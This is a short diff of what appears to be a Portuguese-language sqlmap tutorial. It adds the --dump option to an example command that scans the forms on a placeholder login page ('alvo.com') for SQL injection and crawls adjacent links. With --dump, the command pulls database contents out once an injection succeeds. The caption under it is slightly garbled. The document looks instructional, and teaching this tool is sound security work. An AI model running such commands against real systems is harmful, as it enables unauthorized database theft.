@@ -147,7 +147,7 @@ Realiza o _parsing_ da página web, localizando tags HTML `<form>` e injetando v
 Bash
 
 ```
-sqlmap -u "http://alvo.com/login.php" --forms --crawl=1
+sqlmap -u "http://alvo.com/login.php" --forms --crawl=1 --dump
 ```
 
 _A configuração `--crawl=1` instrui a de rede interna a buscar alvos adjacentes na mesma página de origem._
